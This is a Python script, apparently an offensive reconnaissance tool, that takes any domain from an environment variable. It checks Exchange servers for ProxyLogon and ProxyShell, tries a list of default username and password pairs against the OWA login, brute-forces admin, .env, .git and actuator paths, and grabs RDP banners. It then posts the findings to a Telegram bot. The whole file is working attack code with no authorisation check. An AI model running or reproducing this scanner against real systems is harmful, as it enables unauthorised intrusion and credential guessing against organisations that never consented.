import json
import os
import socket
import ssl
import sys
import urllib.parse
import urllib.request
import urllib.error
from datetime import datetime


socket.setdefaulttimeout(8)

COMMON_PATHS = [
    '/admin/', '/login/', '/wp-admin/', '/administrator/', '/phpmyadmin/',
    '/.env', '/.git/config', '/backup/', '/config/', '/api/',
    '/swagger/', '/graphql', '/v1/', '/v2/', '/debug/',
    '/actuator/', '/health', '/info', '/metrics', '/env',
    '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
    '/wsdl/', '/soap/', '/xmlrpc.php', '/setup/',
    '/console/', '/manager/html', '/jenkins/', '/jolokia/',
]

COMMON_CREDS = [
    ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
    ('admin', 'admin123'), ('administrator', 'administrator'),
    ('admin', 'Admin@123'), ('admin', 'letmein'),
    ('administrator', 'password'), ('admin', 'P@ssw0rd'),
    ('root', 'root'), ('root', 'toor'), ('user', 'user'),
    ('admin', ''), ('admin', '1234'), ('test', 'test'),
]

EXCHANGE_VERSION_PATHS = [
    '/owa/auth/logon.aspx', '/ecp/', '/owa/',
    '/EWS/Exchange.asmx', '/autodiscover/autodiscover.xml',
]

PROXYLOGON_TEST = '/owa/auth/logon.aspx'
PROXYLOGON_HEADERS = {
    'X-OWA-CANARY': 'test',
    'X-Forwarded-For': '127.0.0.1',
    'X-Forwarded-Host': 'localhost',
}


def log(msg):
    print(f'[{datetime.now().strftime("%H:%M:%S")}] {msg}')


def http_get(url, timeout=10, extra_headers=None):
    hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    if extra_headers:
        hdrs.update(extra_headers)
    req = urllib.request.Request(url, headers=hdrs)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(4096)
            return body.decode('utf-8', errors='ignore'), r.status, dict(r.headers)
    except urllib.error.HTTPError as e:
        body = e.read(4096).decode('utf-8', errors='ignore')
        return body, e.code, dict(e.headers) if e.headers else {}
    except Exception as e:
        return '', 0, {}


def grab_banner(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        banner = s.recv(256).decode('utf-8', errors='ignore').strip()[:200]
        s.close()
        return banner
    except Exception:
        return ''


def check_rdp(ip, port=3389):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        s.send(b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
        data = s.recv(256)
        s.close()
        if data:
            log(f'  RDP handshake received ({len(data)} bytes)')
            return True
        return False
    except Exception:
        return False


def check_exchange(domain):
    log('Checking Exchange version and CVEs...')
    results = []
    for sub in ['mail', 'owa', 'exchange', 'autodiscover', 'webmail', '']:
        host = f'{sub}.{domain}' if sub else domain
        for path in EXCHANGE_VERSION_PATHS:
            url = f'https://{host}{path}'
            body, status, headers = http_get(url)
            if status:
                server = headers.get('Server', '')
                x_owa = headers.get('X-OWA-Version', headers.get('X-OWA-Version', ''))
                x_asp = headers.get('X-AspNet-Version', '')
                x_powered = headers.get('X-Powered-By', '')
                ms_sharepoint = headers.get('MicrosoftSharePointTeamServices', '')
                result = {
                    'host': host, 'path': path, 'status': status,
                    'server': server, 'owa_version': x_owa,
                    'asp_version': x_asp, 'powered_by': x_powered,
                }
                results.append(result)
                version_str = x_owa or server or x_asp
                log(f'  {host}{path} -> {status} | {version_str}')
                break
        else:
            continue
        break

    return results


def check_proxylogon(host, path='/owa/auth/logon.aspx'):
    log(f'  ProxyLogon check on {host}...')
    body, status, headers = http_get(f'https://{host}{path}', extra_headers=PROXYLOGON_HEADERS)
    if status:
        log(f'    Status: {status}')
        if status in [200, 302]:
            log(f'    X-OWA-CANARY manipulation check: Server responded with 200/302')
            return {'vulnerable': 'possible', 'note': 'ProxyLogon SSRF may be exploitable'}
        elif status in [401, 500]:
            log(f'    Server rejected request (expected for patched)')
            return {'vulnerable': 'unlikely', 'note': f'Status {status}'}
    return {'vulnerable': 'unknown', 'note': 'No response'}


def check_proxyshell(host):
    log(f'  ProxyShell check on {host}...')
    results = []
    test_paths = [
        '/autodiscover/autodiscover.json?@test.com',
        '/autodiscover/autodiscover.xml?@test.com',
    ]
    for path in test_paths:
        body, status, headers = http_get(f'https://{host}{path}')
        if status == 200:
            log(f'    {path} -> {status} (possible ProxyShell)')
            results.append({'path': path, 'status': status, 'vulnerable': 'possible'})
        elif status:
            log(f'    {path} -> {status}')
            results.append({'path': path, 'status': status, 'vulnerable': 'unlikely'})
    return results


def dir_bruteforce(domain, live_subs):
    log('Brute-forcing common paths...')
    findings = []
    targets = [s for s in live_subs[:5]] + [f'{s}.{domain}' for s in ['admin', 'api', 'portal', 'dashboard'] if f'{s}.{domain}' not in live_subs]
    for target in targets:
        for path in COMMON_PATHS[:15]:
            url = f'https://{target}{path}'
            body, status, headers = http_get(url)
            if status and status not in [404, 403]:
                log(f'  {url} -> {status}')
                findings.append({'url': url, 'status': status, 'server': headers.get('Server', '')})
    return findings


def check_default_creds(host):
    log(f'  Testing default credentials on {host}...')
    findings = []
    login_url = f'https://{host}/owa/auth/logon.aspx'
    for username, password in COMMON_CREDS[:10]:
        data = urllib.parse.urlencode({
            'username': username, 'password': password,
            'destination': 'https://host/owa/',
            'flags': '4',
        }).encode()
        req = urllib.request.Request(login_url, data=data)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
                body = r.read(512).decode('utf-8', errors='ignore')
                if 'The password you supplied is incorrect' not in body:
                    log(f'    {username}:{password} -> POSSIBLE HIT!')
                    findings.append({'username': username, 'password': password})
        except urllib.error.HTTPError as e:
            pass
        except Exception:
            pass
    return findings


def check_spring_actuator(host):
    log(f'  Spring Boot actuator check on {host}...')
    findings = []
    actuator_paths = ['/actuator', '/actuator/health', '/actuator/env', '/actuator/info', '/heapdump']
    for path in actuator_paths:
        body, status, headers = http_get(f'https://{host}{path}')
        if status == 200:
            log(f'    {path} -> {status} (EXPOSED!)')
            findings.append({'path': path, 'body_preview': body[:200]})
        elif status:
            log(f'    {path} -> {status}')
    return findings


def format_vuln_report(domain, exchange_findings, dir_findings, cvss_findings, spring_findings, rdp_hosts):
    msg = f'\U0001F525 <b>Vuln Scan: {domain}</b>\n'
    msg += f'<b>Time:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n\n'

    if exchange_findings:
        msg += '<b>\U0001F4E8 Exchange Findings</b>\n'
        for f in exchange_findings[:10]:
            msg += f'{f["host"]}{f["path"]} -> {f["status"]} | {f.get("server","")[:40]}\n'
            if f.get('owa_version'):
                msg += f'  OWA Version: {f["owa_version"]}\n'
            if f.get('asp_version'):
                msg += f'  ASP.NET: {f["asp_version"]}\n'
        msg += '\n'

    if cvss_findings:
        msg += '<b>\U0001F50D CVE Checks</b>\n'
        for cve in cvss_findings:
            icon = '\U000026A1' if cve.get('vulnerable') == 'possible' else '\U00002705'
            msg += f'{icon} {cve["name"]}: {cve.get("note","")}'
            if cve.get('vulnerable') == 'possible':
                msg += ' \U0001F6A8'
            msg += '\n'
        msg += '\n'

    if spring_findings:
        msg += '<b>\U0001F3E0 Spring Boot Actuators Exposed!</b>\n'
        for f in spring_findings:
            msg += f'  {f["path"]}\n'
        msg += '\n'

    if dir_findings:
        msg += '<b>\U0001F4C2 Interesting Paths</b>\n'
        for f in dir_findings[:8]:
            msg += f'{f["url"]} -> {f["status"]}\n'
        msg += '\n'

    if rdp_hosts:
        msg += '<b>\U0001F5A5 RDP Hosts</b>\n'
        for h in rdp_hosts:
            msg += f'{h}\n'
        msg += '\n'

    return msg


def main():
    domain = os.environ.get('TARGET_DOMAIN')
    bot_token = os.environ.get('BOT_TOKEN')
    chat_id = os.environ.get('CHAT_ID')

    if not domain:
        log('Missing TARGET_DOMAIN')
        sys.exit(1)

    log(f'Starting vuln scan: {domain}')

    ip = ''
    try:
        ip = urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode()
    except:
        pass

    exchange_findings = check_exchange(domain)
    dir_findings = []
    cvss_findings = []
    spring_findings = []
    rdp_hosts = []

    mail_host = None
    for f in exchange_findings:
        if f['status'] and f['host'] not in ['']:
            mail_host = f['host']
            break
    if not mail_host:
        for sub in ['mail', 'owa', 'exchange', 'autodiscover', 'webmail']:
            host = f'{sub}.{domain}'
            body, status, headers = http_get(f'https://{host}/')
            if status:
                mail_host = host
                break

    if mail_host:
        log(f'Using mail host: {mail_host}')
        pl = check_proxylogon(mail_host)
        if pl:
            cvss_findings.append({'name': 'CVE-2021-26855 ProxyLogon', **pl})
        ps = check_proxyshell(mail_host)
        for r in ps:
            cvss_findings.append({'name': 'CVE-2021-34473 ProxyShell', **r})

        dir_findings = dir_bruteforce(domain, [mail_host])
        spring = check_spring_actuator(mail_host)
        spring_findings.extend(spring)

    mail_with_port = mail_host or f'mail.{domain}'
    try:
        ips = [addr[4][0] for addr in socket.getaddrinfo(mail_with_port, 443, socket.AF_INET, socket.SOCK_STREAM)]
        for target_ip in ips[:3]:
            banner = grab_banner(target_ip, 3389)
            if banner:
                rdp_hosts.append(f'{target_ip}:3389 - {banner[:80]}')
                log(f'  RDP on {target_ip}: {banner[:80]}')
    except:
        pass

    msg = format_vuln_report(domain, exchange_findings, dir_findings, cvss_findings, spring_findings, rdp_hosts)

    if len(msg) > 4000:
        msg = msg[:4000] + '\n\n... truncated'

    if bot_token and chat_id:
        try:
            url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
            data = urllib.parse.urlencode({
                'chat_id': chat_id, 'text': msg, 'parse_mode': 'HTML',
                'disable_web_page_preview': 'true'
            }).encode()
            req = urllib.request.Request(url, data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'})
            with urllib.request.urlopen(req, timeout=10):
                pass
            log('Report sent!')
        except Exception as e:
            log(f'Failed to send: {e}')
    else:
        print(msg)


if __name__ == '__main__':
    main()
